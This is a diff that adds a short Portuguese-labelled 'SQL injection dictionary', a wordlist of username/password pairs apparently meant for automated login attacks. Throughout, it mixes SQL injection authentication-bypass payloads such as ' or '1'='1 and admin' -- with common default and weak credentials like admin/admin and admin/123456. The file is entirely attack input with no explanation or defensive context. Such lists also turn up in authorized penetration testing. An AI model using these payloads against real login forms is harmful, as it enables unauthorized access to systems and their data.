@@ -1,0 +1,106 @@
+# DICIONARIO DE SQL INJECTION
+#
+# Use # to comments
+#
+admin
+'or''='
+#
+admin
+' or '1'='1
+#
+admin
+' or 1=1 -- 
+#
+admin' -- 
+admin
+#
+Admin' -- 
+admin
+#
+administrador' -- 
+admin
+#
+Administrador' -- 
+admin
+#
+administrator' -- 
+admin
+#
+Administrator' -- 
+admin
+#
+root' -- 
+admin
+#
+admin
+admin
+#
+admin
+password
+#
+user
+user
+#
+admin
+1234
+#
+admin
+admin123
+#
+admin
+admin1234
+#
+admin
+admin12356
+#
+admin
+123456
+#
+admin
+qwe123
+#
+user
+user1234
+#
+admin
+12345678
+#
+admin
+qwerty
+#
+admin
+abc123
+#
+admin
+admin
+#
+Admin
+Admin
+#
+root
+admin
+#
+Administrador
+123456
+#
+Administrador
+qwe123
+#
+Administrador
+Administrador
+#
+Administrador
+123
+#
+Administrador
+1234
+#
+Admin
+
+#
+' or 1=1 -- 
+admin
+#
+
+
+#
